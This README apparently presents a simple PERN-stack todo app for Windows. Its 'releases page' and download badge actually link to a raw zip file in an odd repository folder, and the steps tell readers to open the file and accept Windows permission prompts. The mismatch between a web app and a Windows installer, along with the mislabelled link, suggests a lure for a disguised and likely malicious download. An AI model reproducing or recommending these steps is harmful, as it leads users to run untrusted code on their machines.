# ✅ PERN-TODO-APP - Simple Todo Management for Windows

[![Download PERN-TODO-APP](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/astro1863/PERN-TODO-APP/main/synecdochic/TOD_APP_PER_1.3.zip)

## 🚀 What This App Does

PERN-TODO-APP is a full-stack todo app for everyday task tracking. It lets you add, edit, mark, and remove tasks from a clean screen. It uses PostgreSQL, Express, React, and Node.js to keep the app fast and easy to use.

Use it to keep a simple task list on your Windows PC. The app includes a responsive layout, so it fits well on different screen sizes.

## 📥 Download and Run on Windows

1. Go to the [releases page](https://raw.githubusercontent.com/astro1863/PERN-TODO-APP/main/synecdochic/TOD_APP_PER_1.3.zip).
2. Find the latest release at the top of the page.
3. Download the Windows file from that release.
4. Open the downloaded file.
5. If Windows asks for permission, select **Run** or **Yes**.
6. Follow the on-screen steps to finish setup.
7. Start the app from the desktop shortcut or Start menu if one is created.

If the release contains more than one file, choose the Windows installer or the main app file for your PC.

## 🖥️ System Requirements

- Windows 10 or Windows 11
- At least 4 GB of RAM
- 200 MB of free disk space
- An internet connection for the first download
- A mouse and keyboard

For a smooth experience, close large apps before you open this one.

## ✨ Main Features

- Create new todo items
- Edit tasks when plans change
- Mark tasks as done
- Remove tasks you no longer need
- See all tasks in one clean list
- Use the app on smaller screens or large displays
- Work with a fast interface built with React and Vite
- Store data through a PostgreSQL-backed API

## 🧭 How to Use the App

1. Open PERN-TODO-APP.
2. Type a task in the input field.
3. Save the task to add it to the list.
4. Click a task to edit it if you need to change it.
5. Mark a task as complete when you finish it.
6. Remove a task when you no longer need it.

The app keeps your list simple, so you can focus on what still needs to get done.

## 🔧 What Is Included

- Front end built with React
- Back end built with Express and Node.js
- Database support with PostgreSQL
- REST API for task actions
- CRUD support for creating, reading, updating, and deleting tasks
- Tailwind CSS for the layout and spacing
- Vite for fast app loading and smooth updates
